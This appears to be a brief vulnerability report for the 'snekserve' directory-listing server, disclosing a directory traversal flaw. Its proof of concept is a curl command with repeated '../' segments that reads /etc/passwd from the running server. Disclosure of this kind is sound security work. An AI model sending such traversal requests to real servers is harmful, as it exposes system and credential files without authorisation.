# Description

The `snekserve` project is a `directory listing` server which is vulnerable against Directory Traversal, which may allow access to sensitive files and data on the server.
 For example, requesting the following URL: `/../../etc/passwd` would result in `/etc/passwd` leaking.


# POC

  1. Start the server node index.js
  2. `curl -v --path-as-is http://127.0.0.1:8080/../../../../../../../../../../../etc/passwd`
  3. `/etc/passwd` of the current user will be displayed.
